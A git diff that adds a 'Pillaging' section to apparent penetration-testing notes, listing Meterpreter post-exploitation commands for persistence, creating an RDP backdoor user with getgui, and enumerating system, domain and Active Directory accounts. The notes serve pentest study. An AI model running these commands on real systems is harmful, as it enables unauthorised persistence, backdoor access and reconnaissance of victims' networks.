@@ -16,3 +16,19 @@ pentesting notes
  - For windows systems, once you have a meterpreter session, `run persistence`
  - `run getgui -e -u atk_user -p atk_password`
  - RDP Service is now started and user 'atk_user' with password 'atk_password' can now rdp into the machine.
+
+## Pillaging
+Commands inside of meterpreter for pillaging data
+- sysinfo
+-- if server, for example, we would know to search and see what type of services are running
+- getuid
+Meterpreter has a good set of gather utilities under:
+- run post/windows/gather OR
+- run post/linux/gather
+These can also be used outsie of the meterpreter session. You just need to use the `use` command, configure its options with `set` and then execute the module with `run`
+### Windows
+- run post/windows/gather/enum_domains
+If the machine is part of a domain, we can enumerate accounts and other information in the default active domain
+- run post/windows/gather/enum_ad_users
+- In a shell, run `net localgroup` to list groups and `net localgroup [GROUPNAME]` to list members of a specific group
+### Linux
